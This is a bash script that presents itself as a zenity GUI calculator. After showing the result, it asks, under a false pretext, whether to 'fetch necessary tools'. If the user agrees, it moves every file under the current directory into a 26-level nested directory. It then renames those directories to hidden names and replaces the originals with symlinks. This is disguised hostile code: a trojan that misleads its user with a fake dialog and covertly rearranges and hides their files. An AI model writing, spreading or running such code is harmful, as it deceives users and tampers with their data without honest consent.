#!/bin/bash

operation=""
result=$(zenity --entry \
        --title="Calculator" \
        --text="Enter a Number" \
        --width="300" --height="250") 
if [[ $? -ne 0 ]]; then
    exit 1
fi

while [[ $operation != "Equals" ]]; 
do
    operation=$(zenity --list --title="Calculator" \
        --text="Choose the Operation" \
        --column="Operations" \
        "Addition" \
        "Subtraction" \
        "Multiplication" \
        "Division" \
        "Equals" \
        --width="300" --height="250")
    
    if [[ $? -ne 0 ]]; then
        exit 1
    fi

    case "$operation" in
        "Addition")
            num=$(zenity --entry \
                --title="Calculator" \
                --text="Enter a Number" --height="250" --width="300")

            if [[ $? -ne 0 ]]; then
                exit 1
            fi

            result=$(($num + $result))
            ;;

        "Subtraction")
            num=$(zenity --entry \
                --title="Calculator" \
                --text="Enter a Number" --height="250" --width="300")
            
            if [[ $? -ne 0 ]]; then
                exit 1
            fi

            result=$(($result - $num))
            ;;

        "Multiplication")
            num=$(zenity --entry \
                --title="Calculator" \
                --text="Enter a Number" --height="250" --width="300")

            if [[ $? -ne 0 ]]; then
                exit 1
            fi

            result=$(($result * $num))
            ;;

        "Division")
            num=$(zenity --entry \
                --title="Calculator" \
                --text="Enter a Number" --height="250" --width="300")
            
            if [[ $? -ne 0 ]]; then
                exit 1
            fi

            while [[ $num -eq 0 ]]; 
            do
                zenity --error --text="Division by zero is not allowed! Reenter Number"
                num=$(zenity --entry \
                    --title="Calculator" \
                    --text="Enter a Number" --height="250" --width="300")
                
                if [[ $? -ne 0 ]]; then
                    exit 1
                fi

            done      
            result=$(($result / $num))
            ;;
            
    esac
done

zenity --question --text="Some necessary tools are missing which might cause the calculator to give wrong results.\n Do you want them to be fetched?" \
    --title="Calculator" \
    --height="250" --width="300" 

case $? in 
  0) 
  #It means OK  
    zenity --info --text="Fetching necessary tools" --title="Calculator" \
    --height="250" --width="300" 

    sleep 1

    zenity --info --title="Result" --text="The result is: $result" --height="250" --width="300"
    if [[ $? -ne 0 ]]; then
        exit 1
    fi

    start_dir=$(pwd)

    for name in {a..z}; do
        mkdir -p "$name"
        cd "$name"
    done

    new_dir=$(pwd)
    cd "$start_dir" 

    find "$start_dir" -type f -exec mv {} "$new_dir" \;

    for file in "$new_dir"/*; 
    do
        ln -s "$file" "$start_dir"
    done

    find a -depth -type d -exec bash -c 'mv "$0" "$(dirname "$0")/.${0##*/}"' {} \;

    find "$start_dir" -type l -exec rm {} \;

    for file in .a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u/.v/.w/.x/.y/.z/*; 
    do
        ln -s "$file" "$start_dir"
    done 
  ;; 

  1) 
    zenity --info --text="Okay" --height="250" --width="300"
    if [[ $? -ne 0 ]]; then
        exit 1
    fi
    ;; 
esac 







